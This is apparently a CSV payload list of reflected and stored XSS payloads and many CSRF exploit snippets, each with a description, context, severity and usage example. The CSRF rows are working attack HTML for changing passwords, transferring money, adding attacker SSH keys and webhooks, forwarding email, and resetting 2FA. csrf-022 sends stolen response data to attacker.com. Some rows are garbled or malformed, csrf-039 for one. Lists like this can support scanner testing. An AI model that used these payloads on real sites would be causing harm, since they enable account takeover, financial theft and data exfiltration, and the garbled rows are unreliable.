id,description,payload,context,type,severity,example_query,example_usage
xss-047,Reflected XSS using malformed script with setTimeout,"<script>setTimeout('alert(""XSS47"")',0)</script>",URL parameter,reflected,high,,"http://example.com/page?param=<script>setTimeout('alert(""XSS47"")',0)</script>"
xss-048,Stored XSS using details tag with ontoggle event,"<details ontoggle='alert(""XSS48"")'><summary>Click me</summary></details>",User input field,stored,high,,"User input: <details ontoggle='alert(""XSS48"")'><summary>Click me</summary</details>"
xss-049,Reflected XSS using input tag with formaction attribute,"<input formaction='javascript:alert(""XSS49"")' type='submit'>",URL parameter,reflected,high,,"http://example.com/page?param=<input formaction='javascript:alert(""XSS49"")' type='submit'>"
xss-050,Stored XSS using svg with animateMotion and onbegin event,"<svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>",User input field,stored,high,,"User input: <svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>"
xss-051,Reflected XSS using script tag with setInterval,"<script>setInterval(function(){alert('XSS51')},1000)</script>",URL parameter,reflected,high,,"http://example.com/page?param=<script>setInterval(function(){alert('XSS51')},1000)</script>"
xss-052,Stored XSS using iframe with onload and srcdoc,"<iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>",User input field,stored,high,,"User input: <iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>"
xss-053,Reflected XSS using svg with onload and script tag,"<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>"
xss-054,Stored XSS using iframe with src set to javascript URI,"<iframe src='javascript:alert(""XSS54"")'></iframe>",User input field,stored,high,,"User input: <iframe src='javascript:alert(""XSS54"")'></iframe>"
xss-055,Reflected XSS using object tag with type attribute and data URI,"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>",URL parameter,reflected,high,,"http://example.com/page?param=<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>"
xss-056,Stored XSS using svg with onload and setTimeout,"<svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>",User input field,stored,high,,"User input: <svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>"
xss-057,Reflected XSS using iframe with srcdoc and encoded script,"<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>",URL parameter,reflected,high,,"http://example.com/page?param=<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>"
xss-058,Stored XSS using svg with animateTransform and onbegin event,"<svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>",User input field,stored,high,,"User input: <svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>"
xss-059,Reflected XSS using script tag with Function constructor,"<script>Function('alert(""XSS59"")')()</script>",URL parameter,reflected,high,,"http://example.com/page?param=<script>Function('alert(""XSS59"")')()</script>"
xss-061,Reflected XSS using SVG with feImage and onload event,<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>,URL parameter,reflected,high,,http://example.com/page?param=<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>
xss-062,Stored XSS using details tag with ontoggle event and script,"<details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>",User input field,stored,high,,"User input: <details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>"
xss-063,Reflected XSS using math tag with href attribute and javascript URI,"<math href='javascript:alert(""XSS63"")'>X</math>",URL parameter,reflected,high,,"http://example.com/page?param=<math href='javascript:alert(""XSS63"")'>X</math>"
xss-064,Stored XSS using audio tag with onerror event,"<audio src='x' onerror='alert(""XSS64"")'></audio>",User input field,stored,high,,"User input: <audio src='x' onerror='alert(""XSS64"")'></audio>"
xss-065,Reflected XSS using iframe with srcdoc and onload event,"<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>",URL parameter,reflected,high,,"http://example.com/page?param=<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>"
xss-066,Stored XSS using svg with animateMotion and onbegin event,"<svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>",User input field,stored,high,,"User input: <svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>"
xss-067,Reflected XSS using input tag with oninvalid event,"<input oninvalid='alert(""XSS67"")' required>",URL parameter,reflected,high,,"http://example.com/page?param=<input oninvalid='alert(""XSS67"")' required>"
xss-068,Stored XSS using iframe with allow attribute and srcdoc,"<iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>",User input field,stored,high,,"User input: <iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>"
xss-069,Reflected XSS using svg with onfocusin event,"<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>"
xss-070,Stored XSS using video tag with onpause event,"<video onpause='alert(""XSS70"")'></video>",User input field,stored,high,,"User input: <video onpause='alert(""XSS70"")'></video>"
xss-071,Reflected XSS using svg with onmouseenter event,"<svg onmouseenter='alert(""XSS71"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onmouseenter='alert(""XSS71"")'></svg>"
xss-072,Stored XSS using form tag with oninput event,"<form oninput='alert(""XSS72"")'><input></form>",User input field,stored,high,,"User input: <form oninput='alert(""XSS72"")'><input></form>"
xss-073,Reflected XSS using svg with onwheel event,"<svg onwheel='alert(""XSS73"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onwheel='alert(""XSS73"")'></svg>"
xss-074,Stored XSS using iframe with allowfullscreen attribute and onload event,"<iframe allowfullscreen onload='alert(""XSS74"")'></iframe>",User input field,stored,high,,"User input: <iframe allowfullscreen onload='alert(""XSS74"")'></iframe>"
xss-075,Reflected XSS using svg with onanimationend event,"<svg onanimationend='alert(""XSS75"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onanimationend='alert(""XSS75"")'></svg>"
xss-076,Stored XSS using audio tag with onplay event,"<audio onplay='alert(""XSS76"")'></audio>",User input field,stored,high,,"User input: <audio onplay='alert(""XSS76"")'></audio>"
xss-077,Reflected XSS using svg with onscroll event,"<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>"
xss-078,Stored XSS using iframe with seamless attribute and onload event,"<iframe seamless onload='alert(""XSS78"")'></iframe>",User input field,stored,high,,"User input: <iframe seamless onload='alert(""XSS78"")'></iframe>"
xss-079,Reflected XSS using svg with oncut event,"<svg oncut='alert(""XSS79"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg oncut='alert(""XSS79"")'></svg>"
xss-080,Stored XSS using svg with oncopy event,"<svg oncopy='alert(""XSS80"")'></svg>",User input field,stored,high,,"User input: <svg oncopy='alert(""XSS80"")'></svg>"
xss-081,Reflected XSS using svg with onpaste event,"<svg onpaste='alert(""XSS81"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onpaste='alert(""XSS81"")'></svg>"
xss-082,Stored XSS using svg with onreset event,"<svg onreset='alert(""XSS82"")'></svg>",User input field,stored,high,,"User input: <svg onreset='alert(""XSS82"")'></svg>"
xss-083,Reflected XSS using svg with onsearch event,"<svg onsearch='alert(""XSS83"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onsearch='alert(""XSS83"")'></svg>"
xss-084,Stored XSS using svg with onselect event,"<svg onselect='alert(""XSS84"")'></svg>",User input field,stored,high,,"User input: <svg onselect='alert(""XSS84"")'></svg>"
xss-085,Reflected XSS using svg with onshow event,"<svg onshow='alert(""XSS85"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onshow='alert(""XSS85"")'></svg>"
xss-086,Stored XSS using svg with ontoggle event,"<svg ontoggle='alert(""XSS86"")'></svg>",User input field,stored,high,,"User input: <svg ontoggle='alert(""XSS86"")'></svg>"
xss-087,Reflected XSS using svg with ontransitionend event,"<svg ontransitionend='alert(""XSS87"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg ontransitionend='alert(""XSS87"")'></svg>"
xss-088,Stored XSS using svg with onunload event,"<svg onunload='alert(""XSS88"")'></svg>",User input field,stored,high,,"User input: <svg onunload='alert(""XSS88"")'></svg>"
xss-089,Reflected XSS using svg with onvolumechange event,"<svg onvolumechange='alert(""XSS89"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onvolumechange='alert(""XSS89"")'></svg>"
xss-090,Stored XSS using svg with onwaiting event,"<svg onwaiting='alert(""XSS90"")'></svg>",User input field,stored,high,,"User input: <svg onwaiting='alert(""XSS90"")'></svg>"
xss-091,Reflected XSS using svg with onwheel event and CSS animation,"<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>"
xss-092,Stored XSS using svg with onpointercancel event,"<svg onpointercancel='alert(""XSS92"")'></svg>",User input field,stored,high,,"User input: <svg onpointercancel='alert(""XSS92"")'></svg>"
xss-093,Reflected XSS using svg with onpointerout event,"<svg onpointerout='alert(""XSS93"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onpointerout='alert(""XSS93"")'></svg>"
xss-094,Stored XSS using svg with onpointerover event,"<svg onpointerover='alert(""XSS94"")'></svg>",User input field,stored,high,,"User input: <svg onpointerover='alert(""XSS94"")'></svg>"
xss-095,Reflected XSS using svg with onpointerup event,"<svg onpointerup='alert(""XSS95"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onpointerup='alert(""XSS95"")'></svg>"
xss-096,Stored XSS using svg with onselectstart event,"<svg onselectstart='alert(""XSS96"")'></svg>",User input field,stored,high,,"User input: <svg onselectstart='alert(""XSS96"")'></svg>"
xss-097,Reflected XSS using svg with onshow event and tabindex,"<svg tabindex='0' onshow='alert(""XSS97"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg tabindex='0' onshow='alert(""XSS97"")'></svg>"
xss-098,Stored XSS using svg with onstalled event,"<svg onstalled='alert(""XSS98"")'></svg>",User input field,stored,high,,"User input: <svg onstalled='alert(""XSS98"")'></svg>"
xss-099,Reflected XSS using svg with onsubmit event,"<svg onsubmit='alert(""XSS99"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onsubmit='alert(""XSS99"")'></svg>"
csrf-001,CSRF using auto-submitting hidden form with POST method,<form action='https://target.com/change-password' method='POST' id='csrfForm'><input type='hidden' name='password' value='hacked123'/></form><script>document.getElementById('csrfForm').submit();</script>,Malicious webpage,CSRF,high,,Embed this form in a malicious page to auto-submit password change.
csrf-002,CSRF using image tag with GET request,<img src='https://target.com/delete-account?confirm=yes' style='display:none'/>,Malicious webpage,CSRF,medium,,Trigger account deletion via GET request.
csrf-003,CSRF using XMLHttpRequest with credentials,"<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/transfer',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('amount=1000&to=attacker');</script>",Malicious webpage,CSRF,high,,Perform unauthorized money transfer.
csrf-004,CSRF using fetch API with credentials,"<script>fetch('https://target.com/update-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@example.com'});</script>",Malicious webpage,CSRF,high,,Change victim's email address.
csrf-005,CSRF using auto-submitting form with file upload,<form action='https://target.com/upload-avatar' method='POST' enctype='multipart/form-data' id='csrfForm'><input type='file' name='avatar' value='malicious.jpg'/></form><script>document.getElementById('csrfForm').submit();</script>,Malicious webpage,CSRF,medium,,Upload malicious avatar file.
csrf-006,CSRF using meta refresh redirect with GET request,<meta http-equiv='refresh' content='0;url=https://target.com/subscribe?plan=premium'/>,Malicious webpage,CSRF,medium,,Subscribe victim to premium plan.
csrf-007,CSRF using script tag to load external script triggering action,<script src='https://attacker.com/csrf-trigger.js'></script>,Malicious webpage,CSRF,high,,Load external script that performs CSRF.
csrf-008,CSRF using iframe with auto-submitting form inside,"<iframe style='display:none' srcdoc=""<form action='https://target.com/settings' method='POST' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Malicious webpage,CSRF,high,,Change user settings silently.
csrf-009,CSRF using SVG with embedded script and form submission,<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>,Malicious webpage,CSRF,high,,Trigger delete API call.
csrf-010,CSRF using beacon API to send POST request,"<script>navigator.sendBeacon('https://target.com/track', 'data=malicious');</script>",Malicious webpage,CSRF,medium,,Send data to target endpoint.
csrf-011,CSRF using form with onsubmit event to modify data,"<form action='https://target.com/update' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",Malicious webpage,CSRF,high,,Modify data before submission.
csrf-012,CSRF using image with onerror event to trigger XMLHttpRequest,"<img src='invalid.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/like',true);xhr.withCredentials=true;xhr.send('post=123');"">",Malicious webpage,CSRF,high,,Like a post on victim's behalf.
csrf-013,CSRF using form with hidden inputs and auto-submit,<form action='https://target.com/transfer' method='POST' id='f'><input type='hidden' name='amount' value='1000'/><input type='hidden' name='to' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,Transfer money silently.
csrf-014,CSRF using fetch with POST and custom headers,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'value=1'});</script>",Malicious webpage,CSRF,high,,Attempt to bypass CSRF token.
csrf-015,CSRF using form with enctype multipart/form-data,<form action='https://target.com/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,medium,,Upload file without user consent.
csrf-016,CSRF using script with setTimeout to delay request,"<script>setTimeout(function(){fetch('https://target.com/api/delete',{method:'POST',credentials:'include'});},1000);</script>",Malicious webpage,CSRF,high,,Delayed delete request.
csrf-017,CSRF using form with target iframe to hide submission,<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/settings' method='POST' target='hiddenFrame' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,Change settings silently.
csrf-018,CSRF using form with GET method and auto-submit,<form action='https://target.com/add-friend' method='GET' id='f'><input name='user' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,medium,,Send friend request without user consent.
csrf-019,CSRF using meta refresh with POST form submission via JavaScript,<form id='f' action='https://target.com/subscribe' method='POST'><input name='plan' value='premium'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,Subscribe victim to premium plan.
csrf-021,CSRF using stealth iframe with delayed form submission,"<iframe style='display:none' id='f'></iframe><form action='https://target.com/api/transfer' method='POST' target='f' id='form'><input name='amount' value='9999'/><input name='to' value='attacker'/></form><script>setTimeout(()=>document.getElementById('form').submit(),2000);</script>",Malicious webpage,CSRF,high,,
csrf-022,CSRF using fetch with chained promises to exfiltrate response,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',body:'setting=evil'}).then(r=>r.text()).then(t=>fetch('https://attacker.com/log?data='+encodeURIComponent(t)));</script>",Malicious webpage,CSRF,critical,,
csrf-023,CSRF using form with multiple hidden inputs and auto-submit,<form action='https://target.com/api/settings' method='POST' id='f'><input type='hidden' name='mode' value='stealth'/><input type='hidden' name='level' value='admin'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,
csrf-024,CSRF using image with onload event triggering XMLHttpRequest,"<img src='https://target.com/api/trigger' onload=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/confirm',true);xhr.withCredentials=true;xhr.send('confirm=yes');"">",Malicious webpage,CSRF,high,,
csrf-025,CSRF using SVG with embedded script to submit form,<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>,Malicious webpage,CSRF,critical,,
csrf-026,CSRF using beacon API with custom payload,"<script>navigator.sendBeacon('https://target.com/api/track','action=steal');</script>",Malicious webpage,CSRF,medium,,
csrf-027,CSRF using form with enctype multipart/form-data and auto-submit,<form action='https://target.com/api/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,medium,,
csrf-028,CSRF using iframe with srcdoc containing auto-submitting form,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Malicious webpage,CSRF,high,,
csrf-029,CSRF using script with setTimeout to chain multiple requests,"<script>setTimeout(()=>fetch('https://target.com/api/step1',{method:'POST',credentials:'include'}),1000);setTimeout(()=>fetch('https://target.com/api/step2',{method:'POST',credentials:'include'}),3000);</script>",Malicious webpage,CSRF,high,,
csrf-030,CSRF using form with target iframe and hidden inputs,<iframe name='hidden' style='display:none'></iframe><form action='https://target.com/api/settings' method='POST' target='hidden' id='f'><input name='mode' value='stealth'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,
csrf-031,CSRF using fetch with spoofed headers (may bypass naive CSRF tokens),"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'data=evil'});</script>",Malicious webpage,CSRF,high,,
csrf-032,CSRF using form with onsubmit event modifying data,"<form action='https://target.com/api/submit' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",Malicious webpage,CSRF,high,,
csrf-033,CSRF using image with onerror event triggering fetch,"<img src='invalid.jpg' onerror=""fetch('https://target.com/api/like',{method:'POST',credentials:'include',body:'post=123'});"">",Malicious webpage,CSRF,high,,
csrf-034,CSRF using meta refresh to redirect to GET endpoint,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=premium'/>,Malicious webpage,CSRF,medium,,
csrf-035,CSRF using script to create and submit form dynamically,<script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script>,Malicious webpage,CSRF,critical,,
csrf-036,CSRF using fetch with JSON payload (if API accepts),"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete'})});</script>",Malicious webpage,CSRF,high,,
csrf-037,CSRF using form with multiple steps and chained submissions,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2000);</script>",Malicious webpage,CSRF,high,,
csrf-038,CSRF using iframe with srcdoc and script to submit form,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Malicious webpage,CSRF,high,,
csrf-039,"CSRF using script with asyncawait fetch('https://target.com/api/async',{method:'POST',credentials:'include',body:'action=async'});</script>",,Malicious webpage,CSRF,high,,
csrf-040,CSRF using form with hidden iframe and delayed submission,"<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/api/hidden' method='POST' target='hiddenFrame' id='f'><input name='secret' value='data'/></form><script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>",Malicious webpage,CSRF,high,,
csrf-041,CSRF using script to create image with onload triggering fetch,"<script>var img=new Image();img.onload=function(){fetch('https://target.com/api/action',{method:'POST',credentials:'include'});};img.src='https://target.com/api/trigger';</script>",Malicious webpage,CSRF,high,,
csrf-042,CSRF using form with multiple hidden inputs and chained submission,"<form action='https://target.com/api/first' method='POST' id='f1'><input type='hidden' name='step' value='1'/></form><form action='https://target.com/api/second' method='POST' id='f2'><input type='hidden' name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2500);</script>",Malicious webpage,CSRF,high,,
csrf-043,CSRF using fetch with custom headers and JSON body,"<script>fetch('https://target.com/api/custom',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({cmd:'run'})});</script>",Malicious webpage,CSRF,high,,
csrf-044,CSRF using form with onsubmit event to modify hidden input,"<form action='https://target.com/api/modify' method='POST' onsubmit='this.token.value=""hacked""'><input type='hidden' name='token' value='original'/></form><script>document.forms[0].submit();</script>",Malicious webpage,CSRF,high,,
csrf-045,CSRF using image with onerror event to trigger XMLHttpRequest,"<img src='nonexistent.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/like',true);xhr.withCredentials=true;xhr.send('post=999');"">",Malicious webpage,CSRF,high,,
csrf-046,CSRF using meta refresh to redirect to sensitive GET endpoint,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=vip'/>,Malicious webpage,CSRF,medium,,
csrf-047,CSRF using script to dynamically create and submit form with delay,"<script>setTimeout(()=>{var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},2000);</script>",Malicious webpage,CSRF,critical,,
csrf-048,CSRF using fetch with JSON body and credentials,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({delete:true})});</script>",Malicious webpage,CSRF,high,,
csrf-049,CSRF using chained form submissions with timeouts,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),3000);</script>",Malicious webpage,CSRF,high,,
csrf-051,CSRF to add admin user via hidden form,<form action='https://example.com/admin/add-user' method='POST' id='f'><input name='username' value='eviladmin'/><input name='role' value='admin'/></form><script>document.getElementById('f').submit();</script>,Admin panel user management,CSRF,critical,,
csrf-052,CSRF to change email notification settings,<form action='https://mail.example.com/settings/notifications' method='POST' id='f'><input name='email_alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,Email service user settings,CSRF,medium,,
csrf-053,CSRF to reset 2FA via GET request,<img src='https://secure.example.com/2fa/reset?user=target' style='display:none'/>,Security 2FA reset endpoint,CSRF,high,,
csrf-054,CSRF to subscribe victim to premium service,<meta http-equiv='refresh' content='0;url=https://streaming.example.com/subscribe?plan=premium'/>,Streaming service subscription,CSRF,medium,,
csrf-055,CSRF to change victim's shipping address,<form action='https://shop.example.com/account/address' method='POST' id='f'><input name='address' value='123 Evil St'/></form><script>document.getElementById('f').submit();</script>,E-commerce user profile,CSRF,high,,
csrf-056,CSRF to add attacker as friend,<form action='https://social.example.com/friends/add' method='POST' id='f'><input name='friend_id' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Social media friend management,CSRF,medium,,
csrf-057,CSRF to post malicious comment,<form action='https://blog.example.com/comments' method='POST' id='f'><input name='post_id' value='123'/><textarea name='comment'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,Blog comment submission,CSRF,medium,,
csrf-058,CSRF to change victim's profile picture,<form action='https://social.example.com/profile/picture' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='avatar' value='evil.jpg'/></form><script>document.getElementById('f').submit();</script>,Social media profile update,CSRF,medium,,
csrf-059,CSRF to initiate money transfer,<form action='https://bank.example.com/transfer' method='POST' id='f'><input name='amount' value='10000'/><input name='to_account' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Online banking transfer,CSRF,critical,,
csrf-060,CSRF to disable security alerts,<form action='https://security.example.com/settings' method='POST' id='f'><input name='alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,Security settings,CSRF,high,,
csrf-061,CSRF to change victim's password,<form action='https://example.com/account/change-password' method='POST' id='f'><input name='new_password' value='P@ssw0rdHacked'/></form><script>document.getElementById('f').submit();</script>,User account management,CSRF,critical,,
csrf-062,CSRF to add malicious webhook URL,<form action='https://ci.example.com/settings/webhooks' method='POST' id='f'><input name='url' value='https://attacker.com/hook'/></form><script>document.getElementById('f').submit();</script>,Continuous Integration webhook settings,CSRF,high,,
csrf-063,CSRF to change victim's timezone,<form action='https://calendar.example.com/settings' method='POST' id='f'><input name='timezone' value='UTC+14'/></form><script>document.getElementById('f').submit();</script>,Calendar application settings,CSRF,low,,
csrf-064,CSRF to enable auto-forwarding of emails,<form action='https://mail.example.com/settings/forwarding' method='POST' id='f'><input name='forward_to' value='attacker@example.com'/></form><script>document.getElementById('f').submit();</script>,Email forwarding settings,CSRF,high,,
csrf-065,CSRF to add malicious SSH key,<form action='https://git.example.com/account/keys' method='POST' id='f'><textarea name='key'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...</textarea></form><script>document.getElementById('f').submit();</script>,Git hosting service SSH keys,CSRF,critical,,
csrf-066,CSRF to change victim's language preference,<form action='https://example.com/settings/language' method='POST' id='f'><input name='lang' value='xx-XX'/></form><script>document.getElementById('f').submit();</script>,User interface settings,CSRF,low,,
csrf-067,CSRF to add victim to attacker's mailing list,<form action='https://newsletter.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>,Newsletter subscription,CSRF,low,,
csrf-068,CSRF to post malicious tweet,<form action='https://twitter.com/i/tweet/create' method='POST' id='f'><textarea name='tweet'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,Social media posting,CSRF,medium,,
csrf-069,CSRF to add victim's phone number to spam list,<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>,SMS spam management,CSRF,medium,,
csrf-070,CSRF to change victim's default payment method,<form action='https://payments.example.com/account/payment-method' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>,Payment gateway account settings,CSRF,high,,
csrf-071,CSRF to enable auto-approve on code reviews,<form action='https://code.example.com/reviews/settings' method='POST' id='f'><input name='auto_approve' value='true'/></form><script>document.getElementById('f').submit();</script>,Code review platform settings,CSRF,high,,
csrf-072,CSRF to add victim's device to attacker's monitoring,<form action='https://iot.example.com/devices/add' method='POST' id='f'><input name='device_id' value='attacker_device'/></form><script>document.getElementById('f').submit();</script>,IoT device management,CSRF,high,,
csrf-073,CSRF to change victim's calendar event,<form action='https://calendar.example.com/events/edit' method='POST' id='f'><input name='event_id' value='123'/><input name='title' value='Hacked Event'/></form><script>document.getElementById('f').submit();</script>,Calendar event management,CSRF,medium,,
csrf-074,CSRF to add victim's IP to blacklist,<form action='https://firewall.example.com/blacklist/add' method='POST' id='f'><input name='ip' value='victim_ip'/></form><script>document.getElementById('f').submit();</script>,Firewall management,CSRF,high,,
csrf-075,CSRF to change victim's DNS settings,<form action='https://dns.example.com/settings' method='POST' id='f'><input name='dns_server' value='8.8.8.8'/></form><script>document.getElementById('f').submit();</script>,DNS management,CSRF,high,,
